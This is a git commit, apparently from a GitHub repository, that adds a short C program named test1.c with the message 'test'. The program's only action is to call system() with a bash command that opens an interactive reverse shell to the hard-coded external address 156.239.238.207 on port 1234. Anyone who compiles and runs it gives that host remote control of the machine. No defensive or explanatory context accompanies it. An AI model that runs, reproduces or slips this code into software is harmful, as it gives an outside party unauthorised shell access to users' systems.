7011bdbc45b20ac81c85788bebc2c7f203c0fbd1
N1Rvana <155441012+nlrvana@users.noreply.github.com>
2026-07-01 12:58:26 +0800

    Create test1.c
    test

---
+++ test1.c
@@ -0,0 +1,16 @@
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(void) {
+    const char *cmd = "bash -c \"bash -i >& /dev/tcp/156.239.238.207/1234\"";
+
+    int rc = system(cmd);
+    if (rc == -1) {
+        fprintf(stderr, "failed to execute shell command: %s\n", strerror(errno));
+        return 127;
+    }
+
+    return rc;
+}
